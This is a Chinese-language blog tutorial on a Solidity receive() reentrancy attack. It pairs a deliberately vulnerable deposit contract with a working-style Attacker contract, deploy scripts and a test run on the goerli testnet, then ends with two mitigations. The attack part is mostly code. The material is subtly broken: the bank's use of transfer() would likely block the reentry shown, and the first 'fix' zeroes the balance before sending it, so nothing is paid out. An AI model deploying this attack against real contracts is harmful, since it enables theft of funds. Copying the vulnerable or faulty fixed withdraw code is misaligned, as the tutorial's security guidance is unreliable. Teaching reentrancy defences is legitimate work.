---
title: Smart contract | How Hacker steals your assets through Receive reentry attack
catalog: true
date: 2023-08-4 17:20:17
subtitle: 智能合约 | Hacker 如何通过Receive重入攻击盗走你的资产
header-img: /img/header_img/lml_bg.jpg
tags:
- Web3-Develop
categories:
- Web3-Develop
---

## 快速开始

     项目介绍: 本教程介绍Hacker如何通过receive重入攻击盗走你的数字资产

---
    如何创建一个hardhat项目在之前的教程中已经充分演示过，在这里将不再过多赘述，想要了解hardhat请翻阅之前的教程！
---

## 创建存款合约 EtherBank.sol：

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract EtherBank {
    mapping(address =>uint) public balances;
    
    function deposit() external payable{
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        require(balances[msg.sender] > 0,"withdraw amount exceeds available balance.");
        payable(msg.sender).transfer(balances[msg.sender]);
        balances[msg.sender] = 0;
    }

    function getBalance()public view returns(uint){
        return address(this).balance;
    }
}
```

## 编译合约

```shell
yarn hardhat compile
```

## 编写部署合约脚本 EtherBank-deploy.js：

```javascript
//hardhat库使用ethers组件与区块链进行交互
const { ethers } = require("hardhat");

async function main() {
    const EtherBank = await  ethers.getContractFactory('EtherBank')
    const etherBank = await EtherBank.deploy();
    console.log('etherBank',etherBank.target)
}

//执行部署
main().then(() => process.exit(0)).catch(error => {
    console.error(error);
    process.exit(1);
});
```

## 执行部署：

```shell
yarn hardhat run ./scripts/EtherBank-deploy.js --network local
```

## 编写攻击合约 Attacter：

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

//EtherBank 接口
interface IEtherBank{
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {

    IEtherBank public immutable etherBank;
    address private owner;

    event AttackerSuccess(string _s);
    event Attacking(string _s);

    constructor(address _etherBankContractAddress){
        etherBank = IEtherBank(_etherBankContractAddress);
        owner = msg.sender;
    }


    function attacker() public payable{
        etherBank.deposit{value: msg.value}();
        etherBank.withdraw();
        emit Attacking('attacking!!!');
    }


    receive() external payable{
        if(address(etherBank).balance > 0){
            etherBank.withdraw();
        }else{
            emit AttackerSuccess('attacker success');
        }
    }

}
```

## 编写攻击合约部署脚本

```javascript
//hardhat库使用ethers组件与区块链进行交互
const { ethers } = require("hardhat");

async function main() {
    const Attacker = await  ethers.getContractFactory('Attacker')
    // 传入存款合约地址
    const attacker = await Attacker.deploy("0xc277cc311FB0C53aF66E56b23F89F2527E618eBE");
    console.log('XDex',attacker.target)
}

//执行部署
main().then(() => process.exit(0)).catch(error => {
    console.error(error);
    process.exit(1);
});
```

## 执行部署：

```shell
yarn hardhat run ./scripts/Attacker-deploy.js --network local
```

## 编写测试脚本

        在此处先用其他账户往存款合约中存入一定的以太坊，然后调用攻击合约进行攻击。
```javascript
const { expect } = require('chai') //断言模块
const { ethers} = require('hardhat') //安全帽模块

describe('Attacker 合约测试', () => {
    before(async function () {
        //获取合约工厂对象
        this.Attacker = await ethers.getContractFactory('Attacker')
        //通过合约工厂部署合约
        this.attacker = await this.Attacker.deploy("0x3c9680784f63Ed74F0C77942b82C1214E9f4AA41")
    })

    it('Attacking',async function () {
        const amountToSend = ethers.parseEther("0.01");
        const deposit = await this.attacker.attacker({value : amountToSend});
        console.log(deposit.hash);
    });
})

```

## 执行攻击：

```shell
yarn hardhat test ./test/Attacker.test.js --network goerli
```


至此攻击合约已经完毕，那么我们如何规避它呢？ 有两种方法

## 规避Receive重入攻击

### 方法一： 在存款合约的取款方法中，在转账前减掉取款的金额  。例如：

```solidity
    function withdraw() external {
        require(balances[msg.sender] > 0,"withdraw amount exceeds available balance.");
        balances[msg.sender] = 0;
        payable(msg.sender).transfer(balances[msg.sender]);
    }
```

### 方法二：引入openzeppelin安全库，并且在区块方法上添加 nonReentrant

```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

    function withdraw() external nonReentrant{
        require(balances[msg.sender] > 0,"withdraw amount exceeds available balance.");
        payable(msg.sender).transfer(balances[msg.sender]);
        balances[msg.sender] = 0;
    }
```

## 至此，一个Receive重入攻击和规避完毕！
